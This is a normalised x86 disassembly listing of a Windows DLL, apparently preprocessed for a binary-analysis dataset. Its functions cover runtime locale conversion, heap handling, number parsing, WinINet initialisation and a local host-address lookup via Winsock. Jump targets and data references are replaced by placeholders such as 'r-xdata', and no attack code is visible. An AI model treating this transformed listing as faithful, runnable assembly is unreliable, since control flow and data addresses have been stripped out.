push edx
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0xd4 ]
call eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x6c ]
push esi
push eax
call edx
mov eax [ ebp + 0xc ]
mov eax [ eax ]
lea edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
test eax eax
js r-xdata
lea eax [ esi + 0x2 ]
mov esp ebp
pop ebp
retn 0xc
mov eax 0x1
mov esp ebp
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x4 ]
mov [ ebp + 0x8 ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
xor eax eax
mov esp ebp
pop ebp
retn 0xc
sub_10022901
mov edi edi
push ebp
mov ebp esp
mov dl [ ebp + 0xc ]
push esi
cmp [ ebp + 0x10 ] dl
jg r-xdata
cmp [ ebp + 0x14 ] dl
jg r-xdata
movsx ecx [ ebp + 0x10 ]
movsx eax dl
lea esi [ ecx + 0x9 ]
cmp eax esi
jg r-xdata
cmp [ ebp + 0x18 ] dl
jg r-xdata
movsx ecx [ ebp + 0x14 ]
movsx eax dl
lea esi [ ecx + 0x5 ]
cmp eax esi
jg r-xdata
sub eax ecx
jmp r-xdata
or eax 0xffffffff
movsx ecx [ ebp + 0x18 ]
movsx eax dl
lea edx [ ecx + 0x5 ]
cmp eax edx
jle r-xdata
sub eax ecx
add eax 0xa
jmp r-xdata
pop esi
pop ebp
retn
sub_10022954
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1006a508
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_10055531
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_1004fd6f
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10022a6a
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
xor ebx ebx
call sub_1006a508
mov eax [ ebp - 0x1c ]
mov edi [ eax + 0xd4 ]
lea esi [ edi + 0x38 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0xc
push [ esi + 0x30 ]
call sub_10079b60
push [ esi ]
mov [ ebp - 0xc ] eax
call sub_10079b60
mov esi [ ebp - 0x8 ]
pop ecx
pop ecx
mov ecx [ ebp - 0xc ]
add eax ebx
add esi 0x4
dec [ ebp - 0x4 ]
lea ebx [ eax + ecx + 0x2 ]
mov [ ebp - 0x8 ] esi
jne r-xdata
lea eax [ ebx + 0x1 ]
push eax
call sub_10008102
mov esi eax
pop ecx
mov [ ebp - 0x8 ] esi
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
and [ ebp - 0x4 ] 0x0
add edi 0x68
mov eax [ ebp - 0x8 ]
leave
retn
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100492ed
int3
push esi
call sub_10079b60
add esi eax
mov eax [ ebp - 0x8 ]
mov [ esi ] 0x3a
push [ edi ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_1006605f
add esp 0x10
test eax eax
jne r-xdata
push esi
call sub_10079b60
add esi eax
inc [ ebp - 0x4 ]
add edi 0x4
cmp [ ebp - 0x4 ] 0xc
pop ecx
jb r-xdata
mov eax [ ebp - 0x8 ]
mov [ esi ] 0x3a
push [ edi - 0x30 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
call sub_1006605f
add esp 0xc
test eax eax
jne r-xdata
mov [ esi ] 0x0
sub_10022b5a
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_1004fd6f
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_100027ad
pop ecx
mov [ esi ] eax
pop esi
sub_10022ba0
push ebp
mov ebp esp
mov edx [ rw-data ]
mov ecx [ edx + 0x10 ]
mov eax [ edx + 0xc ]
push esi
cmp eax ecx
je r-xdata
or eax 0xffffffff
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
cmp eax ecx
jne r-xdata
add eax 0x8
cmp eax ecx
jne r-xdata
mov ecx [ ebp + 0x10 ]
xor esi esi
cmp ecx esi
jne r-xdata
cmp [ eax ] esi
je r-xdata
cmp ecx 0x2
jne r-xdata
mov ecx [ edx + 0x4 ]
mov edx [ ebp + 0xc ]
cmp edx ecx
jae r-xdata
cmp ecx 0x1
jne r-xdata
mov ecx [ edx + 0x4 ]
mov edx [ ebp + 0xc ]
cmp edx ecx
jae r-xdata
mov [ eax + 0x4 ] ecx
mov eax ecx
pop esi
pop ebp
retn
mov [ eax + 0x4 ] edx
mov eax edx
pop esi
pop ebp
retn
xor eax eax
pop esi
pop ebp
retn
mov ecx [ ebp + 0xc ]
cmp ecx esi
jle r-xdata
mov [ eax + 0x4 ] esi
mov eax esi
pop esi
pop ebp
retn
sub ecx edx
mov edx [ eax + 0x4 ]
add edx ecx
je r-xdata
mov esi [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
add esi ecx
cmp esi edx
jae r-xdata
add [ eax + 0x4 ] ecx
mov eax [ eax + 0x4 ]
pop esi
pop ebp
retn
add [ eax + 0x4 ] ecx
mov eax [ eax + 0x4 ]
pop esi
pop ebp
retn
sub_10022c40
push ebp
mov ebp esp
mov eax [ ebp + 0x1c ]
mov edx [ ebp + 0x14 ]
push esi
push eax
mov eax [ ebp + 0x10 ]
mov esi ecx
mov ecx [ ebp + 0x18 ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push eax
push ecx
mov [ esi ] 0x0
call [ InternetOpenW@IAT ]
xor edx edx
test eax eax
setne dl
mov [ esi ] eax
push edx
call sub_10051250
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x18
sub_10022c80
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10082e3b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x2c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x40 ]
mov [ fs : 0x0 ] eax
mov edi edx
cmp [ edi + 0x14 ] 0x8
mov esi ecx
mov [ esp + 0xc ] 0x0
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test dx dx
je r-xdata
mov ecx r--data
mov eax [ esi + 0x39c ]
mov [ esp + 0xc ] eax
inc eax
push 0xd0
mov [ esi + 0x39c ] eax
call sub_10055606
add esp 0x4
mov [ esp + 0x10 ] eax
mov [ esp + 0x48 ] 0x0
test eax eax
je r-xdata
lea eax [ esp + 0xc ]
push eax
call sub_1003b1ca
add esp 0x4
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
xor edi edi
mov edx [ esp + 0xc ]
push edi
push edx
push eax
call sub_10005700
mov edi eax
jmp r-xdata
mov ecx [ esp + 0xc ]
lea edi [ esi + 0x3c0 ]
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ecx
mov [ esp + 0x14 ] 0x0
call sub_10053c70
inc [ esi + 0x3d0 ]
jmp r-xdata
lea edx [ esp + 0x18 ]
mov eax 0x133
call sub_10013830
jmp r-xdata
test eax eax
jne r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
cmp eax [ esi + 0x3a8 ]
jne r-xdata
mov ecx [ esi + 0x3a0 ]
lea edx [ esp + 0x10 ]
cmp ecx edx
ja r-xdata
mov [ esp + 0x48 ] 0xffffffff
mov eax [ esi + 0x3a4 ]
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] edi
cmp ecx eax
jae r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x40 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x2c ]
xor ecx esp
call sub_10024145
mov esp ebp
pop ebp
retn
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
mov eax [ esi + 0x3a4 ]
test eax eax
je r-xdata
lea eax [ esi + 0x3a0 ]
call sub_10020b00
mov edi edx
sub edi ecx
sar edi 0x2
cmp eax [ esi + 0x3a8 ]
jne r-xdata
add [ esi + 0x3a4 ] 0x4
mov [ eax ] edi
mov eax [ esi + 0x3a4 ]
test eax eax
je r-xdata
lea eax [ esi + 0x3a0 ]
call sub_10020b00
mov ecx [ esi + 0x3a0 ]
mov edx [ ecx + edi * 4 ]
mov [ eax ] edx
jmp r-xdata
sub_10022e30
push 0x4c
mov eax sub_1007f9ce
call sub_1001bb6b
mov edi [ ebp + 0x8 ]
and [ ebp - 0x30 ] 0x0
mov ebx [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
inc eax
call sub_1004fa89
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x10
call sub_10055606
mov esi eax
pop ecx
mov [ ebp - 0x34 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_10034337
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x30 ] 0x1
jb r-xdata
test [ ebp - 0x30 ] 0x1
je r-xdata
and [ ebp - 0x30 ] 0xfffffffd
lea ecx [ ebp - 0x58 ]
call sub_10039680
push eax
lea ecx [ ebp - 0x58 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x30 ] 0x3
mov [ esi ] r--data
call sub_10062816
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov eax [ eax ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10041a20
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ edi ] esi
test [ ebp - 0x30 ] al
je r-xdata
sub_10022ef0
push ebp
mov ebp esp
push 0xffffffff
push sub_10082e80
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov eax ecx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
lea esi [ eax + 0x1 ]
mov edi edi
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax esi
push eax
push ecx
lea ecx [ ebp - 0x2c ]
call sub_10043190
mov [ ebp - 0x4 ] ebx
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x2c ]
mov ecx edx
cmp eax 0x10
jae r-xdata
add ecx [ ebp - 0x1c ]
cmp eax 0x10
mov eax edx
jae r-xdata
lea ecx [ ebp - 0x2c ]
xor edx edx
mov [ ebp - 0x48 ] dx
mov edx [ ebp - 0x4c ]
push edx
push ecx
push eax
lea eax [ ebp - 0x48 ]
push eax
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] ebx
call sub_100150f0
lea edx [ ebp - 0x48 ]
mov ecx edi
mov [ ebp - 0x4 ] 0x1
call sub_10022c80
cmp [ ebp - 0x34 ] 0x8
mov esi eax
jb r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_1006591f
add esp 0x4
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x2c ]
push edx
call sub_1006591f
add esp 0x4
sub_10022fe0
push ebp
mov ebp esp
sub esp 0x230
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
lea eax [ ebp - 0x230 ]
push eax
push 0x2
mov ebx ecx
call [ WSAStartup@IAT ]
test eax eax
je r-xdata
push 0x80
lea ecx [ ebp - 0xa0 ]
push ecx
call [ gethostname@IAT ]
test eax eax
je r-xdata
mov eax 0x1
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xa0 ]
push edx
call [ gethostbyname@IAT ]
mov esi eax
test esi esi
jne r-xdata
call [ WSACleanup@IAT ]
mov eax 0x2
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x1c ]
mov eax 0xd
call sub_10015360
mov eax [ esi + 0xc ]
mov eax [ eax ]
movzx ecx [ eax + 0x3 ]
movzx edx [ eax + 0x2 ]
push ecx
movzx ecx [ eax + 0x1 ]
push edx
movzx edx [ eax ]
push ecx
push edx
lea eax [ ebp - 0x1c ]
push eax
mov ecx 0x10
call sub_10041b00
add esp 0x14
call [ WSACleanup@IAT ]
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
call [ WSACleanup@IAT ]
lea eax [ esi + 0x3 ]
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_100230e4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1006a508
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x1
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_1001116c
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_10023140
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi [ rw-data ]
mov eax [ edi + 0x8 ]
sub eax [ edi + 0x4 ]
sar eax 0x2
cmp eax 0x1
ja r-xdata
push esi
mov esi [ edi + 0x4 ]
cmp esi [ edi + 0x8 ]
je r-xdata
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
pop esi
xor eax eax
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
nop
push ebx
push eax
call [ StrCmpW@IAT ]
test eax eax
je r-xdata
mov eax [ eax ]
mov ecx [ edi + 0x8 ]
lea eax [ esi + 0x4 ]
sub ecx eax
sar ecx 0x2
add ecx ecx
add ecx ecx
push ecx
push eax
push esi
call sub_10078db0
add [ edi + 0x8 ] 0xfffffffc
add esp 0xc
xor eax eax
add esi 0x4
cmp esi [ edi + 0x8 ]
jne r-xdata
inc eax
cmp eax 0x10
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
mov eax 0x1
pop edi
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ esi ]
add eax 0x20
cmp [ eax + 0x14 ] 0x8
jb r-xdata
sub_100231ee
push 0x80
mov eax sub_1007f73e
call sub_1001bb6b
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x18 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x70 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x8c ] eax
lea eax [ ebp - 0x88 ]
push eax
mov [ ebp - 0x74 ] edi
call sub_100688a0
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_1001fccb
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x78 ] eax
call sub_10069ce0
mov ecx [ ebp - 0x78 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_10051f6c
add edi 0x8
push edi
push ebx
push 0x30
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x6c ] edi
call sub_1003088d
push edi
movzx eax ax
push ebx
push 0x61
mov [ ebp - 0x60 ] eax
call sub_1003088d
push edi
movzx eax ax
push ebx
push 0x41
mov [ ebp - 0x80 ] eax
call sub_1003088d
movzx eax ax
add esp 0x24
push [ ebp - 0x5c ]
mov [ ebp - 0x7c ] eax
mov eax [ ebp - 0x70 ]
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x51 ] bl
call sub_100081b8
test al al
jne r-xdata
mov eax [ ebp - 0x50 ]
push [ ebp - 0x5c ]
mov [ eax ] 0x7830
add eax 0x2
mov ecx esi
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x49 ] bl
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x68 ] ebx
call sub_100081b8
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2b
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x60 ]
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x70 ]
mov [ eax ] 0x2b
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov ecx esi
call sub_1005576a
push [ ebp - 0x5c ]
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2d
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
inc eax
mov ecx esi
mov [ ebp - 0x50 ] eax
call sub_1005576a
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x49 ] bl
je r-xdata
cmp [ eax ] bl
jle r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x49 ] 0x1
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x70 ]
mov [ eax ] 0x2d
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_1002fd7b
mov edi eax
add esp 0x14
cmp edi ebx
jl r-xdata
mov ecx esi
call sub_10023e65
push [ ebp - 0x5c ]
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
cmp [ ebp - 0x58 ] ebx
jne r-xdata
cmp [ ebp - 0x38 ] ebx
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x78
call sub_1003088d
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x58 ] 0x24
jl r-xdata
cmp [ ebp - 0x58 ] ebx
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
mov ecx [ ebp - 0x78 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax ax
mov [ ebp - 0x84 ] eax
mov [ ebp - 0x84 ] ebx
jmp r-xdata
mov ecx esi
call sub_1005576a
jmp r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
inc [ ebp - 0x68 ]
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x78 ]
mov eax [ ecx ]
movzx edi [ esi + 0x6 ]
call [ eax + 0x4 ]
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_10006560
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x64 ] ebx
call sub_100081b8
test al al
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x58
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_10023e65
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005576a
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x49 ] bl
je r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
call sub_100680bc
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_1005576a
cmp [ ebp - 0x51 ] bl
jne r-xdata
lea edx [ ebp - 0x48 ]
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_1002fd7b
mov edi eax
add esp 0x14
cmp edi ebx
jl r-xdata
mov ecx esi
call sub_10023e65
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
cmp [ ebp - 0x58 ] ebx
je r-xdata
push [ ebp - 0x7c ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x80 ]
push [ ebp - 0x60 ]
push eax
push [ ebp - 0x74 ]
call sub_1002fd7b
add esp 0x14
cmp eax ebx
jl r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x51 ] bl
jne r-xdata
push [ ebp - 0x5c ]
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ ebp - 0x68 ] ebx
jge r-xdata
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10041a20
jmp r-xdata
mov edi [ ebp - 0x64 ]
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x58 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
cmp [ ebp - 0x58 ] 0x24
jge r-xdata
mov eax [ ebp - 0x70 ]
jmp r-xdata
cmp [ ebp - 0x49 ] bl
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ax [ ebp - 0x60 ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_10023e65
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x68 ]
mov [ eax ] 0x30
jmp r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] bl
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x4 ] bl
jne r-xdata
inc [ ebp - 0x68 ]
jmp r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005576a
mov ecx [ ebp - 0x50 ]
mov al [ eax + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx [ ebp - 0x8c ]
mov [ eax ] bl
mov eax [ ebp - 0x68 ]
push ebx
mov [ ecx ] eax
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10041a20
xor eax eax
call sub_1004fa89
retn
mov eax [ ebp - 0x50 ]
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x70
call sub_1003088d
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_10023e65
dec [ ebp - 0x68 ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005576a
dec edi
je r-xdata
cmp [ ebp - 0x64 ] ebx
je r-xdata
cmp [ ebp - 0x84 ] bx
je r-xdata
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x60 ]
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov ecx esi
mov [ eax ] 0x70
call sub_1005576a
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] bl
mov [ ebp - 0x58 ] ebx
call sub_100081b8
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp edi ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ edi + r--data ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
cmp [ ebp - 0x58 ] ebx
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov edi [ ebp - 0x5c ]
push edi
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x50
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
cmp [ edx + 0x1 ] bl
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x64 ]
cmp [ eax + ecx ] bl
jle r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
cmp ax [ ebp - 0x84 ]
jne r-xdata
mov ecx esi
call sub_10023e65
mov ecx esi
call sub_1005576a
push [ ebp - 0x5c ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push edi
mov ecx esi
call sub_100081b8
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
push [ ebp - 0x6c ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x2b
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
